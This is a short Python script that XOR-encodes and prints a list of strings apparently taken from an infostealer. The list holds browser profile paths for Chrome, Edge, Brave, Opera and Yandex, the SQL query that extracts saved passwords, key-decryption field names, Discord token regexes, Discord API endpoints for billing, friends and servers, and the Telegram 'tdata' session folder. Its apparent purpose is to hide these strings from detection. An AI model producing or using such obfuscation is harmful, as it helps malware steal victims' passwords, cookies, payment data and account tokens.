keys = [
    'Google\\Chrome\\User Data', 
    'Microsoft\\Edge\\User Data', 
    'Microsoft\\Edge Beta\\User Data', 
    'BraveSoftware\\Brave-Browser\\User Data', 
    'Opera Software\\Opera Stable', 
    'Opera Software\\Opera GX Stable', 
    'Yandex\\YandexBrowser\\User Data', 
    'Login Data', 
    'Local State', 
    'Network\\Cookies',
    'SELECT origin_url, username_value, password_value FROM logins', 
    'os_crypt', 
    'encrypted_key', 
    '[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}', 
    'mfa\\.[\\w-]{84}', 
    'dQw4w9WgXcQ:[^" ]{60,160}',
    'https://discord.com/api/v9/users/@me',
    'https://discord.com/api/v9/users/@me/billing/payment-sources',
    'https://discord.com/api/v9/users/@me/relationships',
    'https://discord.com/api/v9/users/@me/guilds',
    'Telegram Desktop',
    'tdata'
]
for k in keys:
    print(f"{k} -> {''.join(chr(ord(c)^5) for c in k)}")
